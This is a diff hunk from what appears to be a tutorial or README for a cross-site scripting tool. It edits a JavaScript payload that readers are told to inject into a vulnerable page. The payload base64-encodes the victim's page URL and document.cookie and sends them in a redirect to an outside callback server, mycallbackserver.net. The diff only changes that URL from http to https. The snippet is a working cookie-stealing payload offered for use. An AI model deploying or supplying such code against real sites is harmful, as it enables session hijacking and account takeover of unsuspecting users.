@@ -12,7 +12,7 @@ Then throw the following code in your XSS payload. Be sure to change the address
 
 ```javascript
 const token = "w3lRZ87e";
-if (location.hash != token) self.location = "http://mycallbackserver.net/callback.php" + 
+if (location.hash != token) self.location = "https://mycallbackserver.net/callback.php" + 
                 	"?origin=" + encodeURIComponent( btoa(self.location.href) ) + 
                 	"&data=" + encodeURIComponent( btoa(document.cookie) ) + 
                 	"&token=" + encodeURIComponent( btoa(token) );
